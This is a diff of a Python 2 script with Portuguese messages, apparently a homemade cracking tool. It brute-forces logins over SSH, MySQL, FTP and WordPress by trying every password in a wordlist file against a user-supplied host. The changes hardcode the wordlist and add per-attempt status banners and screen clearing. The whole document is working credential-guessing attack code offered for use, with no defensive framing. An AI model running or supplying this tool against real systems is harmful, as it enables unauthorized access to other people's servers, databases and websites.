@@ -3,7 +3,7 @@ import sys
 import subprocess
 import re
 import socket
-from os import system
+import os
 import requests
 import paramiko
 
@@ -24,29 +24,21 @@ def ssha():
     sshost = raw_input(">>> ")
     print "\n[+] Username"
     ssuser = raw_input(">>> ")
-    print "\n[+] Wordlist"
-    sslista = raw_input(">>> ")
-    try:
-        sshlist = open(sslista)
-    except:
-        print "[+] Wordlist não encontrada"
-        exit()
-
+    sshlist = open('wordlist.txt', 'r')
     for nlinha in sshlist.readlines():
         try:
+            os.system(['clear', 'cls'][os.name == 'nt'])
+            print  sshbanner
+            print "[+] Testando... "+ssuser+" - "+nlinha
             ssh.connect(sshost, username=ssuser, password=nlinha)
         except:
-            print '                 '+ssuser+" | "+nlinha
-            print '            Credenciais Incorretas..'
-            print '|------------------------------------------------------|'
-        else:
-            print '| Senha_encontrada ! ---> '+ssuser+' - '+nlinha
-            exit()
-    ssh.close
+            ssh.close
+            continue
+    
 
 
 def mysql():
-    system("clear")
+    
     banner = """
           _________________
          |.---------------.|
@@ -71,7 +63,7 @@ def mysql():
     for linha in fo.readlines():
         command = "mysql -h {0} -u {1} -p{2} -e STATUS".format(sqlhost, sqluser, linha)
         brute = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
-        system("clear")
+        os.system(['clear', 'cls'][os.name == 'nt'])
         print banner
         print "[+] Testando... "+sqluser+" : "+linha
         if(re.search("Uptime", brute.communicate()[0])):
@@ -81,27 +73,20 @@ def mysql():
             continue
 
 def ftp():
-    system("clear")
-    print("""\r\n
+    
+    ftpbanner = """\r\n
      ___   _____   ___          ___   ___   _ _     ___   _  __  ___   ___ 
     | __| |_   _| | _ \        / __| | _ \ | | |   / __| | |/ / | __| | _ \_
     | _|    | |   |  _/       | (__  |   / |_  _| | (__  | ' <  | _|  |   /
     |_|     |_|   |_|    ___   \___| |_|_\   |_|   \___| |_|\_\ |___| |_|_\_
                         |___|                                              
-    """)
+    """
     print("\n[+] Username:")
     ftpuser = raw_input('>>> ')
-    print("\n[+] Wordlist: ")
-    ftplist = raw_input('>>>')
-    try:
-        ar = open(ftplist)
-        lis = ar.readlines()
-    except:
-        pass
+    ftplist = open('wordlist.txt', 'r')
     print "\n[+] Host: "
     ftphost = raw_input('>>> ')
-    for i in lis:
-        print " 	         "+ftpuser+" | " + i
+    for i in ftplist.readlines():
         cone = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             cone.connect((ftphost, 21))
@@ -109,16 +94,18 @@ def ftp():
         except:
             print '[+] Conexão recusada'
             exit()
+        os.system(['clear', 'cls'][os.name == 'nt'])
+        print ftpbanner
+        print "[+] Testando... "+ftpuser+" - "+i
         cone.sendall('USER '+ftpuser+'\r\n')
         res = cone.recv(1024)
         cone.sendall('PASS '+i+'\r\n')
         res = cone.recv(1024)
         if re.search('230', res):
-            print('| Senha_encontrada ! ---> ', ftpuser, ' - ', i)
+            print '[+] Senha_encontrada ==> ', ftpuser, ' - ', i
             exit()
         else:
-            print '            Credenciais Incorretas..'
-            print '|------------------------------------------------------|'
+            continue    
 
 def wordpress():
     wpbanner = """
@@ -141,26 +128,26 @@ def wordpress():
       `-'       `--' 
     
     """
-    print wpbanner
-    print "\n[+] url /wp-login"
+    
+    print "\n[+] Url /wp-login"
     url = raw_input(">>> ")
     print "\n[+] Username"
-    wpuser = raw_input(">>> ")
+    wpuser = raw_input('>>> ')
     file_pass = open("wordlist.txt")
-    try:
-        for wpsenha in file_pass.readlines():
-            payload = {'log': wpuser, 'pwd': wpsenha}
-            requisicao = requests.post(url, data=payload)
-            if 'Bem-vindo ao WordPress!' in requisicao.text:
-                print '| Senha_encontrada ! ---> '+wpuser+' - '+wpsenha
-                exit()
-            else:
-                print "                "+wpuser+' - '+wpsenha
-                print '            Credenciais Incorretas..'
-                print '|------------------------------------------------------|'
+    
+    for wpsenha in file_pass.readlines():
+        os.system(['clear', 'cls'][os.name == 'nt'])
+        print wpbanner
+        print "[+] Testando... "+wpuser+" : "+wpsenha
+        payload = {'log': wpuser, 'pwd': wpsenha}
+        requisicao = requests.post(url, data=payload)
+        if 'Bem-vindo ao WordPress!' in requisicao.text:
+            print '[+] Senha encontrada ===> '+wpuser+' - '+wpsenha
+            exit()
+        else:
+            continue                
 
-    except KeyboardInterrupt:
-        print "\nScript encerrado!"
+
 
 mainbanner = """                            
       
@@ -190,7 +177,7 @@ mainbanner = """
 """
 
 def main():
-    system("clear")
+    os.system(['clear', 'cls'][os.name == 'nt'])
     print(mainbanner)
     opcao = int(input(">>> "))
     if opcao == 1:
